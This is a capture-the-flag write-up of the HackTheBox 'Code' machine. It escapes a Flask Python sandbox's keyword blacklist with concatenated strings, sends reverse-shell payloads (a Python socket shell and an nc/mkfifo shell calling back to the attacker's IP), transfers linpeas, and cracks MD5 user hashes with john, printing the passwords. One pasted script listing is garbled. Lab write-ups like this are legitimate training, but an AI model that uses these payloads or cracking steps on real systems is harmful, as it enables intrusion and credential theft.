---
layout: page
title: Code
description: Bypassed Python word and import blacklists.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/logo.png" title="HTB Code Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/code">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Alright, code retired and now I can make my write-up for it.

The first thing we always do is to run our nmap to try and identify services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.62 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 23:17 AEST
Nmap scan report for 10.10.11.62
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   720.88 ms 10.10.16.1
2   192.78 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.46 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Since TCP is only half the battle, let's give nmap a run too.

{% capture t_bash %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ sudo nmap -sU -oN nmapudp 10.10.11.62     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 23:18 AEST
Nmap scan report for 10.10.11.62
Host is up (0.23s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT      STATE         SERVICE
17836/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1021.88 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=t_bash %}

<br />
Let's check the langing page that is being served on port 5000.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/landingpage.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
We see a python environment.  Try to import OS to see what happens.  Fail miserably.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/runos.png" title="Import OS" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Go to Revshells to generate a python reverse shell payload.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Start a netcat listener.

{% capture start443listener %}
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start443listener %}

<br />
Try to encode the payload in base64.

{% capture encodepayload %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | base64
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjEyIiw0NDMpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKQo=
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=encodepayload %}

<br />
Catch the request in burp suite and send it to repeater until we get it to work.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/catchrepeater.png" title="Catch Repeater" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Set-up Decoder to encode the payload in URL encoding.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/urlencoderevshells.png" title="URL encode Rev Shells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try the encoded payload.  Fail...again.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/testoriginalrevshells.png" title="Test Original RevShells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
In the Decoder, roll it back to print just to get it to work.  Test it in repeater.  From here on out, every Decoder change will be tested in Repeater but not documented here.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/encodehello.png" title="Encode Hello." class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create python string that assigns '__builtins__', '__import__', os, and system to variables separated by semicolons.  Separate the strings and concatenate back at run time to try and break the blacklist.

{% capture startpayload %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm';
{% endcapture %}
{% include terminal.html language='python' title='Start Payload' content=startpayload %}

<br />
Add a print statement to the end of the command so we can see output in Repeater while we test.

{% capture adddebugprint %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print('Hello');
{% endcapture %}
{% include terminal.html language='python' title='Add Debug Print' content=adddebugprint %}

<br />
Call the globals() function to get a dictionary of the global symbols.

{% capture pullglobalsystems %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals());
{% endcapture %}
{% include terminal.html language='python' title='Pull Global Symbols' content=pullglobalsystems %}

<br />
From the globals dictionary, you can use the bi rebuilt string as a key value for the dictionary to fetch the builtins.

{% capture fetchbuiltins %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi]);
{% endcapture %}
{% include terminal.html language='python' title='Fetch Builtins' content=fetchbuiltins %}

<br />
From the builtins, we can use the im variable to then fetch the import.

{% capture fetchimport %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi][im]);
{% endcapture %}
{% include terminal.html language='python' title='Fetch import' content=fetchimport %}

<br />
Use the li variable as an argument for the import function to be able to import the os library.

{% capture importos %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi][im](li));
{% endcapture %}
{% include terminal.html language='python' title='Import OS' content=importos %}

<br />
Pull in the dictionary for the OS import.

{% capture getosdict %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi][im](li).__dict__);
{% endcapture %}
{% include terminal.html language='python' title='Get OS Dictionary' content=getosdict %}

<br />
Use the sis variable to pull in the system function.

{% capture importsystem %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi][im](li).__dict__[sis]);
{% endcapture %}
{% include terminal.html language='python' title='Import System' content=importsystem %}

<br />
Use revshells to generate a second payload.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/revshells.png" title="Revshells Second Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the python snippet to include the Revshells second payload as an argument to the system function.

{% capture addpayload %}
bi = '__b' + 'u' + 'i' + 'l' + 't' + 'i' + 'n' + 's' + '__'; im = '__i' + 'm' + 'p' + 'o' + 'r' + 't__'; li = 'o' + 's'; sis = 's' + 'y' + 's' + 't' + 'e' + 'm'; print(globals()[bi][im](li).__dict__[sis]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.12 443 >/tmp/f'));
{% endcapture %}
{% include terminal.html language='python' title='Add Payload' content=addpayload %}

<br />
URL encode the entire python snippet so we can safely send it to the server.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/encodeattackstring.png" title="Encode Attack String" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% capture urlencodeattackstring %}
%62%69%20%3d%20%27%5f%5f%62%27%20%2b%20%27%75%27%20%2b%20%27%69%27%20%2b%20%27%6c%27%20%2b%20%27%74%27%20%2b%20%27%69%27%20%2b%20%27%6e%27%20%2b%20%27%73%27%20%2b%20%27%5f%5f%27%3b%20%69%6d%20%3d%20%27%5f%5f%69%27%20%2b%20%27%6d%27%20%2b%20%27%70%27%20%2b%20%27%6f%27%20%2b%20%27%72%27%20%2b%20%27%74%5f%5f%27%3b%20%6c%69%20%3d%20%27%6f%27%20%2b%20%27%73%27%3b%20%73%69%73%20%3d%20%27%73%27%20%2b%20%27%79%27%20%2b%20%27%73%27%20%2b%20%27%74%27%20%2b%20%27%65%27%20%2b%20%27%6d%27%3b%20%70%72%69%6e%74%28%67%6c%6f%62%61%6c%73%28%29%5b%62%69%5d%5b%69%6d%5d%28%6c%69%29%2e%5f%5f%64%69%63%74%5f%5f%5b%73%69%73%5d%28%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%31%32%20%34%34%33%20%3e%2f%74%6d%70%2f%66%27%29%29%3b
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=urlencodeattackstring %}

<br />
Use the url encoded string in the repeater for the code data parameter.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/repeaterfinalpayload.png" title="Repeater Final Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% capture catchshell %}
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.62] 54848
bash: cannot set terminal process group (9394): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Get the user flag.

{% capture userflag %}
app-production@code:~$ cat user.txt
cat user.txt
<redacted>
app-production@code:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:c7:74 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:c774/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:fe95:c774/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Download linpeas.

{% capture downloadpeas %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250526-1dfc12a0/linpeas.sh -O linpeas.sh
--2025-05-26 15:35:23--  https://github.com/peass-ng/PEASS-ng/releases/download/20250526-1dfc12a0/linpeas.sh
Resolving github.com (github.com)... 140.82.114.4
Connecting to github.com (github.com)|140.82.114.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ac3f84fe-755a-418f-a5b1-534b4a5dc1ca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250526%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250526T053528Z&X-Amz-Expires=300&X-Amz-Signature=13c9f6c970343bbf6667620ecaa07212fc1f55c3b74dc61813d3ce020b197e52&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-05-26 15:35:24--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ac3f84fe-755a-418f-a5b1-534b4a5dc1ca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250526%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250526T053528Z&X-Amz-Expires=300&X-Amz-Signature=13c9f6c970343bbf6667620ecaa07212fc1f55c3b74dc61813d3ce020b197e52&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954386 (932K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 932.02K   965KB/s    in 1.0s    

2025-05-26 15:35:26 (965 KB/s) - ‘linpeas.sh’ saved [954386/954386]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadpeas %}

<br />
Transfer linpeas to the victim machine.

{% capture transferpeas %}
app-production@code:/opt$ cd /dev/shm
cd /dev/shm
app-production@code:/dev/shm$ wget 10.10.16.12:8000/linpeas.sh
wget 10.10.16.12:8000/linpeas.sh
--2025-05-26 05:35:56--  http://10.10.16.12:8000/linpeas.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954386 (932K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 932.02K   208KB/s    in 6.1s    

2025-05-26 05:36:03 (152 KB/s) - ‘linpeas.sh’ saved [954386/954386]

app-production@code:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferpeas %}

<br />
Run linpeas to see if it reveals anything interesting.

{% capture runpeas %}
app-production@code:/dev/shm$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/bin/backy.sh                                                                                                                                                                                                                           
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-02-24+22:34:48.2465009780 /usr/local/sbin/laurel                                                                                                                                                                                       
2024-09-16+05:08:30.1840089610 /usr/bin/backy.sh
2024-08-26+21:09:03.7339804200 /usr/bin/backy
2024-07-27+22:08:41.7032616280 /usr/local/bin/flask

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runpeas %}

<br />
Check the backy file that we discovered in the linpeas output.  Note the restrictions about the folders and the use of the parent folder notation.

{% capture catbackysh %}
app-production@code:~/app$ ls -la /usr/bin/backy.sh
ls -la /usr/bin/backy.sh
-rwxr-xr-x 1 root root 926 Sep 16  2024 /usr/bin/backy.sh
app-production@code:~/app$ cat /usr/bin/backy.sh
cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_jso
done

/usr/bin/backy "$json_file"n" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catbackysh %}

<br />
Run the backy script so we can see what it does in practice.

{% capture runbacky %}
app-production@code:~/app$ /usr/bin/backy -h
/usr/bin/backy -h
2025/05/26 12:19:05 🍀 backy 1.2
2025/05/26 12:19:05 📋 Working with -h ...
2025/05/26 12:19:05 🔰 Task configuration: destination must be specified!
2025/05/26 12:19:05 ❗ Can't read provided task configuration
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runbacky %}

<br />
Cat the app.py so we can see what it is trying to do.

{% capture catapppy %}
app-production@code:~/app$ cat app.py
cat app.py
{% endcapture %}

{% capture apppy %}
from flask import Flask, render_template,render_template_string, request, jsonify, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
import sys
import io
import os
import hashlib

app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    codes = db.relationship('Code', backref='user', lazy=True)



class Code(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)
    name = db.Column(db.String(100), nullable=False)

    def __init__(self, user_id, code, name):
        self.user_id = user_id
        self.code = code
        self.name = name

@app.route('/')
def index():
    code_id = request.args.get('code_id')
    return render_template('index.html', code_id=code_id)


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('User already exists. Please choose a different username.')
        else:
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.')
            return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            session['user_id'] = user.id
            flash('Login successful!')
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials. Please try again.')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    flash('You have been logged out.')
    return redirect(url_for('index'))

@app.route('/run_code', methods=['POST'])
def  run_code():
    code = request.form['code']
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    try:
        for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']:
            if keyword in code.lower():
                return jsonify({'output': 'Use of restricted keywords is not allowed.'})
        exec(code)
        output = redirected_output.getvalue()
    except Exception as e:
        output = str(e)
    finally:
        sys.stdout = old_stdout
    return jsonify({'output': output})

@app.route('/load_code/<int:code_id>')
def load_code(code_id):
    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))
    code = Code.query.get_or_404(code_id)
    if code.user_id != session['user_id']:
        flash('You do not have permission to view this code.')
        return redirect(url_for('codes'))
    return jsonify({'code': code.code})


@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' not in session:
        return jsonify({'message': 'You must be logged in to save code.'}), 401
    user_id = session['user_id']
    code = request.form.get('code')
    name = request.form.get('name')
    if not code or not name:
        return jsonify({'message': 'Code and name are required.'}), 400
    new_code = Code(user_id=user_id, code=code, name=name)
    db.session.add(new_code)
    db.session.commit()
    return jsonify({'message': 'Code saved successfully!'})


@app.route('/codes', methods=['GET', 'POST'])
def codes():

    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))

    user_id = session['user_id']
    codes = Code.query.filter_by(user_id=user_id).all()

    if request.method == 'POST':
        code_id = request.form.get('code_id')
        code = Code.query.get(code_id)
        if code and code.user_id == user_id:
            db.session.delete(code)
            db.session.commit()
            flash('Code deleted successfully!')
        else:
            flash('Code not found or you do not have permission to delete it.')
        return redirect(url_for('codes'))     
    return render_template('codes.html',codes=codes)


@app.route('/about')
def about():
    return render_template('about.html')

if __name__ == '__main__':
    if not os.path.exists('database.db'):
        with app.app_context():
            db.create_all()
    app.run(host='0.0.0.0', port=5000)
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catapppy %}

{% include terminal.html language='python' title='app.py' content=apppy %}

<br />
Run strings against the app database.

{% capture stringsdb %}
app-production@code:~/app$ ls
ls
app.py
instance
__pycache__
static
templates
app-production@code:~/app$ cd instance
cd instance
app-production@code:~/app/instance$ ls
ls
database.db
app-production@code:~/app/instance$ strings database.db
strings database.db
SQLite format 3
tablecodecode
CREATE TABLE code (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        name VARCHAR(100) NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
7tableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password VARCHAR(80) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mmartin3de6f30c4a09c27fc71932bfc68474be/
#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
martin
#       development
print("Functionality test")Test
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=stringsdb %}

{% capture pyserver %}
app-production@code:~/app/instance$ python3 -m http.server 9001
python3 -m http.server 9001
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=pyserver %}

<br />
Transfer the database to the attack machine.

{% capture transferdb %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ wget 10.10.11.62:9001/database.db -O database.db                                                      
Prepended http:// to '10.10.11.62:9001/database.db'
--2025-05-27 00:15:06--  http://10.10.11.62:9001/database.db
Connecting to 10.10.11.62:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [application/octet-stream]
Saving to: ‘database.db’

database.db                                                100%[========================================================================================================================================>]  16.00K  25.7KB/s    in 0.6s    

2025-05-27 00:15:07 (25.7 KB/s) - ‘database.db’ saved [16384/16384]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferdb %}

<br />
View in sqlitebrowser to get a better view than the strings output.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/code/dbbrowse.png" title="DB Browse" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Copy the password into a file so we can feed then into john.

{% capture catpassestxt %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ cat passes.txt 
{% endcapture %}

{% capture passestxt %}
development:759b74ce43947f5f4c91aeddc3e5bad3
martin:3de6f30c4a09c27fc71932bfc68474be
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catpassestxt %}

{% include codebox.html title="passes.txt" content=passestxt %}

<br />
Use john to crack the passwords from the files.

{% capture johncrack %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 passes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (development)     
nafeelswordsmaster (martin)     
